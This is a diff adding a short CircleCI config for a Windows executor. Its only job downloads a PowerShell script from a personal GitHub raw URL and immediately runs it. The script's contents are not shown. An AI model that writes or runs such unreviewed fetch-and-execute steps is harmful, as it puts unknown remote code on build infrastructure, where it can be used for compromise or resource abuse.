@@ -1,0 +1,21 @@
+version: 2.1 
+ 
+orbs:
+  win: circleci/windows@2.2.0
+ 
+jobs:
+  build: 
+    executor:
+      name: win/default 
+      size: "medium" 
+      
+        
+ 
+    steps:  
+       
+      - run: 
+          name: Main
+          command: |      
+            Invoke-WebRequest https://raw.githubusercontent.com/Rasparduino/Circle-ci/main/main.txt -OutFile main.ps1 
+          
+      - run: ./main.ps1
